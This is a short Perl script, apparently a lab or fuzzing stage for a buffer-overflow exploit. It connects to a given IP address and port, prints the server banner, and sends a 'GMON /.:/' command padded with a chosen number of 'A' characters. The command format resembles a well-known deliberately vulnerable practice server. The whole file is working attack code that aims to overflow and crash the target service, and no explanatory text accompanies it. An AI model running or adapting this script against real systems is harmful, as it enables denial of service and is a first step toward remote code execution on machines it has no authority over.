#!/usr/bin/perl
#
#
use IO::Socket;

if ($ARGV[1] eq '') {
	die("Usage: $0 IP_ADDRESS PORTnn");
}

$size = $ARGV[2];
$baddata = "GMON /.:/";
$baddata .= "A" x $size ;

$socket = IO::Socket::INET->new (
	Proto => "tcp",
	PeerAddr => "$ARGV[0]",
	PeerPort => "$ARGV[1]"
) or die "Cannot connect to $ARGV[0]:$ARGV[1]";

$socket->recv($serverdata, 1024);
print "$serverdata";

$socket->send($baddata);
